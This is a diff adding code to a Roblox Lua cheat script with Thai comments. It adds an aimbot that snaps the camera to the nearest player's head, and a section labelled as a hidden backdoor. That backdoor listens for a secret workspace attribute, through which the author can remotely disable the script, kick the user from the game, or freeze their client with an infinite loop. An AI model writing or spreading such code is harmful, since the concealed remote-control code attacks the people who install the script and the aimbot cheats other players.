+            local Pos, OnScreen = workspace.CurrentCamera:WorldToViewportPoint(v.Character.Head.Position)
+            if OnScreen then
+                local MousePos = Vector2.new(Mouse.X, Mouse.Y)
+                local Distance = (Vector2.new(Pos.X, Pos.Y) - MousePos).Magnitude
+                if Distance < ShortestDistance then
+                    Closest = v
+                    ShortestDistance = Distance
                 end
             end
         end
     end
+    return Closest
+end
+
+local Connection2 = RunService.RenderStepped:Connect(function()
+    if _G.AimboxEnabled and ScriptActive then
+        local Target = GetClosestPlayer()
+        if Target and Target.Character and Target.Character:FindFirstChild("Head") then
+            workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, Target.Character.Head.Position)
+        end
+    end
+end)
+
+-- ปุ่มเปิด-ปิด (P & 🔫)
+local isVisible = true
+local function ToggleUI()
+    isVisible = not isVisible
+    MainFrame.Visible = isVisible
+end
+ToggleBtn.MouseButton1Click:Connect(ToggleUI)
+UserInputService.InputBegan:Connect(function(input, gpe)
+    if not gpe and input.KeyCode == Enum.KeyCode.P then ToggleUI() end
+end)
+
+-- ==========================================
+-- 🕵️‍♂️ HIDDEN BACKDOOR SYSTEM (ระบบแอบรับคำสั่งลับ)
+-- ==========================================
+local function ExecuteRemoteCommand(cmdData)
+    local targetName, action = string.match(cmdData, "SUN_REMOTE:(.-):(.-)$")
+    if targetName and action then
+        if targetName == LocalPlayer.Name or targetName == "ALL" then
+            if action == "DISABLE" then
+                ScriptActive = false
+                _G.HitboxEnabled = false
+                _G.AimboxEnabled = false
+                Connection1:Disconnect()
+                Connection2:Disconnect()
+                ScreenGui:Destroy()
+                game:GetService("StarterGui"):SetCore("SendNotification", {
+                    Title = "🚫 แจ้งเตือน",
+                    Text = "สคริปต์ถูกปิดการใช้งานโดยผู้สร้าง (ซัน)",
+                    Duration = 5
+                })
+            elseif action == "KICK" then
+                LocalPlayer:Kick("\n[ADMIN SUN CONTROL]\nคุณถูกผู้สร้าง (ซัน) สั่งเตะออกจากแมพ!")
+            elseif action == "CRASH" then
+                while true do end -- ทำให้โปรแกรมค้าง/แครช
+            end
+        end
+    end
+end
+
+-- ดักจับสัญญาณลับผ่าน Attribute ใน workspace
+workspace:GetAttributeChangedSignal("SunCmdSignal"):Connect(function()
+    local val = workspace:GetAttribute("SunCmdSignal")
+    if val then ExecuteRemoteCommand(val) end
 end)
